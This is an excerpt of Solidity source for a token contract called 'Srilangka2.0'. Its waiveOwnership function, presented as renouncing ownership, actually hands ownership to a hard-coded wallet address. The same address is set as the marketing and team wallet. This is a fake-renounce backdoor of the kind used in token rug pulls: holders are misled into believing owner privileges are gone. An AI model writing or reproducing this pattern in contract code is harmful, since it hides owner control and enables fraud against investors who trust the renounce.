...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xaE98c5e84157904F8eB552185bA0301c1C94B9fC);
    }
...
contract Srilangkav2 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Srilangka2.0";
    string private _symbol = "Srilangka2.0";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xaE98c5e84157904F8eB552185bA0301c1C94B9fC);
    address payable public teamWalletAddress = payable(0xaE98c5e84157904F8eB552185bA0301c1C94B9fC);
